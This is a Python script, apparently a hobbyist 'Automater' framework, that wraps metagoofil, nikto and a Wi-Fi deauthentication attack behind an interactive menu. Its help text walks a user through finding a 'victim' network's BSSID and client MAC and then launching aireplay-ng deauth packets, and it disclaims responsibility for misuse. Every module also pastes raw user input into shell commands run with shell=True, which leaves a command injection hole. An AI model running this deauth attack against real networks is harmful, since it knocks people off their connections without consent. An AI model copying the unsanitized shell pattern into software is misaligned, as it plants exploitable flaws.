import subprocess
import random

def welcome():
    var = random.randint(0,4)
    if var == 0:
        print("    _         _                        _            ")
        print("   / \  _   _| |_ ___  _ __ ___   __ _| |_ ___ _ __ ")
        print("  / _ \| | | | __/ _ \| '_ ` _ \ / _` | __/ _ \ '__|")
        print(" / ___ \ |_| | || (_) | | | | | | (_| | ||  __/ |   v.1.0.0")
        print("/_/   \_\__,_|\__\___/|_| |_| |_|\__,_|\__\___|_|   By @Kr0n0s")
        print()
    if var == 1:
        print("   #                                                          ")
        print("  # #   #    # #####  ####  #    #   ##   ##### ###### #####  ")
        print(" #   #  #    #   #   #    # ##  ##  #  #    #   #      #    # ")
        print("#     # #    #   #   #    # # ## # #    #   #   #####  #    # ")
        print("####### #    #   #   #    # #    # ######   #   #      #####  ")
        print("#     # #    #   #   #    # #    # #    #   #   #      #   #  v.1.0.0")
        print("#     #  ####    #    ####  #    # #    #   #   ###### #    # By @Kr0n0s")
    if var == 2:
        print("               _                        _            ")
        print("    /\        | |                      | |           ")
        print("   /  \  _   _| |_ ___  _ __ ___   __ _| |_ ___ _ __ ")
        print("  / /\ \| | | | __/ _ \| '_ ` _ \ / _` | __/ _ \ '__|")
        print(" / ____ \ |_| | || (_) | | | | | | (_| | ||  __/ |   v.1.0.0")
        print("/_/    \_\__,_|\__\___/|_| |_| |_|\__,_|\__\___|_|   By @Kr0n0s")
    if var == 3:
        print("    \          |                         |             ")
        print("   _ \   |   | __|  _ \  __ `__ \   _` | __|  _ \  __| ")
        print("  ___ \  |   | |   (   | |   |   | (   | |    __/ |   v.1.0.0")
        print("_/    _\\__,_|\__|\___/ _|  _|  _|\__,_|\__|\___|_|   By @Kr0n0s ")
    if var == 4:
        print("   _       _                  _           ")
        print("  /_\ _  _| |_ ___ _ __  __ _| |_ ___ _ _ ")
        print(" / _ \ || |  _/ _ \ '  \/ _` |  _/ -_) '_| v.1.0.0")
        print("/_/ \_\_,_|\__\___/_|_|_\__,_|\__\___|_|   By @Kr0n0s")

def help():
    welcome()
    print("This is an automated framework for newbie and for lazy people")
    print("I AM NOT RESPONSIBLE FOR THE USE YOU WILL HAVE WITH MY PROJECT!")
    print()
    print("Available commands:")
    print("\thelp ==> Show this help message")
    print("\tInformation gathering:")
    print("\t\tmetagoofil ==> Collects gathering metadata")
    print("\t\twhois ==> Provide names, physical address, phone number, etc... of a domain")
    print("\tScanner:")
    print("\t\tnikto ==> Make a vulnerability scanner")
    print("\tWi-Fi:")
    print("\t\tdeauth ==> Make a deauth attack")
    print("\texit ==> Exit the framework")

def metagoofil():
    print("You have chosen the module: metagoofil")
    domain = ""
    file0 = ""
    while True:
        command = str(input("#metagoofil>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module collects information (file), and shows: owner the creation date, etc...")
            print("Available commands:")
            print("\thelp ==> Show this help message")
            print("\tdomain ==> Set the domain address")
            print("\tfile ==> Set the file type that you want to find (pdf, odt) [no dot]")
            print("\tshow values ==> Show the current value of the variables")
            print("\texecute ==> Start the information gathering")
            print("\tback ==> Go back to the main menu")
        if command.startswith("domain") or command.endswith("domain"):
            domain1 = command.replace("domain", "")
            domain = domain1.replace(" ", "")
            print("domain ==>", domain)
        if command.startswith("file") or command.endswith("file"):
            file1 = command.replace("file", "")
            file0 = file1.replace(" ", "")
            print("file ==>", file0)
        if command.startswith("show values") or command.endswith("show values"):
            print("domain ==>", domain)
            print("file ==>", file0)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "metagoofil -d " + domain + " -t " + file0
            try:
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: metagoofil")
            break

def whois():
    pass

def nikto():
    print("You have chosen the module: nikto")
    target = ""
    while True:
        command = str(input("#nikto>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a scan of the target with the aim of finding vulnerabilities")
            print("\thelp ==> Show this help message")
            print("\ttarget ==> Set the target host")
            print("\tshow values ==> Show the current value of the variables")
            print("\texecute ==> Start the scanner")
            print("\tback ==> Go back to the main menu")
        if command.startswith("target") or command.endswith("target"):
            target1 = command.replace("target", "")
            target = target1.replace(" ", "")
            print("target =>", target)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "nikto -host " + target
            try:
                subprocess.run(shell1, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("show values") or command.endswith("show value"):
            print("target =>", target)
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: nikto")
            break

def deauth():
    print("You have chosen the module: deauth")
    interface = ""
    bssid = ""
    mac = ""
    number = ""
    channel = ""
    while True:
        command = str(input("#deauth>>>"))
        if command.startswith("help") or command.endswith("help"):
            print("This module make a deauth attack")
            print("Before you use this module you have to run, in another terminal, \"airmon-ng start wlan0\" and then \"airodump-ng wlan0\"")
            print("when you see your victim hit Ctrl-C and enter the command \"airmon-ng stop wlan0mon\". This allows you to get what you need")
            print("\thelp ==> Show this message")
            print("\tinterface ==> Select the interface (not in monitor mode)")
            print("\tbssid ==> Set the bssid of the vicitim (you find it in the column: BSSID)")
            print("\tmac ==> Set the mac of the victim (you can find it in the column: STATION, in the line with the victim's bssid)")
            print("\tnumber ==> Set the number of packets to send")
            print("\tchannel ==> Set the channel of the victim (between 1 and 13) (in the column: CH, in the line with the victim's bssid")
            print("\tshow values ==> Show the current value of the variables")
            print("\texecute ==> Start the attack")
            print("\tback ==> Go back to the main menu")
        if command.startswith("interface") or command.endswith("interface"):
            interface1 = command.replace("interface", "")
            interface = interface1.replace(" ", "")
            print("interface =>", interface)
        if command.startswith("bssid") or command.endswith("bssid"):
            bssid1 = command.replace("bssid", "")
            bssid = bssid1.replace(" ", "")
            print("bssid =>", bssid)
        if command.startswith("mac") or command.endswith("mac"):
            mac1 = command.replace("mac", "")
            mac = mac1.replace(" ", "")
            print("mac =>", mac)
        if command.startswith("number") or command.endswith("number"):
            number1 = command.replace("number", "")
            number = number1.replace(" ", "")
            print("number =>", number)
        if command.startswith("channel") or command.endswith("channel"):
            channel1 = command.replace("channel", "")
            channel = channel1.replace(" ", "")
            print("channel =>", channel)
        if command.startswith("show values") or command.endswith("show value"):
            print("interface =>", interface)
            print("bssid ==>", bssid)
            print("mac ==>", mac)
            print("number ==>", number)
            print("channel ==>", channel)
        if command.startswith("execute") or command.endswith("execute"):
            shell1 = "airmon-ng start " + interface + " " + channel
            interface2 = interface + "mon"
            shell2 = "aireplay-ng -0 " + number + " -a " + bssid + " -c " + mac + " " + interface2
            try:
                subprocess.run(shell1, shell=True)
                subprocess.run(shell2, shell=True)
            except:
                print("There is some trouble...")
                print("Did you install the dependency? (there is the installer if you are using a OS with use apt as package manager)")
                print("Are you running this script on Linux?")
        if command.startswith("back") or command.endswith("back"):
            print("Exiting from module: deauth")
            break

welcome()
while True:
    command = str(input("#>>>"))
    if command.startswith("help") or command.endswith("help"):
        help()
    if command.startswith("metagoofil") or command.endswith("metagoofil"):
        metagoofil()
    if command.startswith("deauth") or command.endswith("deauth"):
        deauth()
    if command.startswith("nikto") or command.endswith("nikto"):
        nikto()
    if command.startswith("exit") or command.endswith("exit"):
        print("See you at the next hack ;-)")
        break
